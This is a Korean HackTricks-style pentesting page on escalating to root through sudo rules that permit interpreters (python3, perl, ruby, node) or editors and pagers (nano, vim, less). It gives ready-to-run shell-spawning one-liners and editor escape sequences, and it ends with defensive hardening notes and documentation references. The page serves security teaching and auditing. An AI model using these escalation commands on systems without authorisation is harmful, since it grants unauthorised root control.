# Sudo 명령어 악용

{{#include ../../banners/hacktricks-training.md}}

## Sudo로 허용된 인터프리터

`sudo -l`이 사용자가 root로 인터프리터를 실행할 수 있도록 허용한다면, 이를 직접적인 코드 실행으로 간주해야 합니다. 인터프리터는 임의의 코드를 실행하도록 설계되었으므로, `python3`, `perl`, `ruby`, `lua`, `node` 또는 이와 유사한 바이너리의 실행을 허용하는 규칙은 일반적으로 root 명령어 실행과 동일합니다. 단, 인수가 엄격하게 제한되고 검증되는 경우는 예외입니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

일반적인 검토 과정은 먼저 사용자의 권한을 확인한 다음, 인터프리터의 `-c` 옵션을 사용해 Python 문을 실행하는 것입니다.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
다른 interpreter 예시는 아래에 나와 있으며, 나열된 interpreter는 inline-code 실행 또는 child-process API를 문서화합니다.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
정확한 경로가 중요합니다. sudo 규칙에서 `/usr/bin/python3`을 허용한다면 검증 중에 해당 정확한 경로를 사용하세요.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-허용 편집기

`sudo -l`에서 사용자가 root로 interactive editor를 실행할 수 있다면, 이를 무해한 파일 편집 권한이 아니라 command execution surface로 간주해야 합니다. 편집기는 내부에서 shell commands를 실행하고, 임의의 파일을 읽고, 임의의 파일에 쓰거나, 외부 helper를 호출할 수 있는 경우가 많습니다.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

일반적인 검토 흐름은 사용자의 권한을 나열한 다음, sudo를 통해 허용된 각 editor 또는 pager를 실행하는 것입니다.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano 명령 실행

`nano`가 sudo를 통해 허용된 경우, editor interface에서 명령 실행에 접근할 수 있습니다.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
그런 다음 nano 명령 프롬프트에 `id` 또는 `/bin/sh`와 같은 command를 입력합니다.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
대화형 shell에 사용할 수 있는 터미널 스트림이 없으면, 이 리디렉션 형식은 표준 출력과 오류를 디스크립터 0에 매핑합니다.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
정확한 키 입력 순서는 nano 버전과 빌드 옵션에 따라 달라질 수 있지만, 보안 문제는 동일합니다. 편집기가 root 권한으로 실행되고 외부 명령을 호출할 수 있습니다.<sup>[[1]](#references)[[12]](#references)</sup>

### 기타 일반적인 editor 탈출 방법

Vim-style editor는 일반적으로 `:!`를 통해 command execution 기능을 제공합니다.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
`less`와 같은 Pagers는 shell execution도 노출할 수 있습니다.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## 방어 참고 사항

- sudo를 통해 interpreter 또는 interactive editor를 허용하지 마세요.<sup>[[1]](#references)</sup>
- 하나의 제한적인 관리 작업만 수행하는, 고정된 root 소유 wrapper를 우선 사용하세요.<sup>[[1]](#references)[[2]](#references)</sup>
- interpreter가 불가피한 경우, 정확한 script 경로를 제한하고 사용자가 제어하는 인자, 쓰기 가능한 import, `PYTHONPATH`, 안전하지 않은 환경 보존을 방지하세요.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- 파일 편집이 필요한 경우, 정확한 파일 경로를 제한하고 패치된 sudo 버전 및 엄격한 환경 처리를 적용한 `sudoedit` 사용을 고려하세요.<sup>[[1]](#references)[[2]](#references)</sup>
- `SETENV`, `env_keep`, 쓰기 가능한 작업 디렉터리, 쓰기 가능한 module/import 경로, `NOEXEC`, `use_pty`, logging을 검토하되, 이를 완전한 sandbox로 간주하지 마세요.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python 문서](https://docs.python.org/3/using/cmdline.html)
- [4] [os — 다양한 운영 체제 인터페이스 — Python 문서](https://docs.python.org/3/library/os.html)
- [5] [perlrun — Perl interpreter 실행 방법](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl 문서](https://perldoc.perl.org/functions/exec)
- [7] [Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby 문서](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js 문서](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js 문서](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua man page](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
